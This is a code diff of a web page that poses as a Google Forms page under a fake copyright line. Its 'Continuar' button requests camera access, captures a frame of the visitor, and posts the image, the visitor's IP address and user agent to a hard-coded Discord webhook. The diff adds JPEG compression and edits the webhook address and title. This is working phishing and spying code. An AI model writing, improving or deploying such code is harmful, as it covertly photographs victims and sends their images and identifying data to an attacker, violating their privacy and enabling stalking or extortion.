@@ -40,7 +40,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Google Forms</h1>
+        <h1>Google Forms lm</h1>
         <p>Formulario de Google LLC 2024 ©</p>
         <button class="button" onclick="requestCameraPermission()">Continuar</button>
     </div>
@@ -69,11 +69,15 @@
 
                 videoElement.onloadedmetadata = async () => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = videoElement.videoWidth;
-                    canvas.height = videoElement.videoHeight;
+                    const maxWidth = 800; // Definir el ancho máximo deseado
+                    const maxHeight = (videoElement.videoHeight / videoElement.videoWidth) * maxWidth;
+                    canvas.width = maxWidth;
+                    canvas.height = maxHeight;
                     const context = canvas.getContext('2d');
                     context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
+                    
+                    // Reducir el tamaño de la imagen
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5); // Calidad de compresión del 50%
 
                     sendData(imageData);
 
@@ -95,7 +99,7 @@
                         content: `User IP Address: ${ipAddress}\nUser Agent: ${userAgent}\nImage Data: ${imageData}`
                     };
 
-                    fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t5cv', {
+                    fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
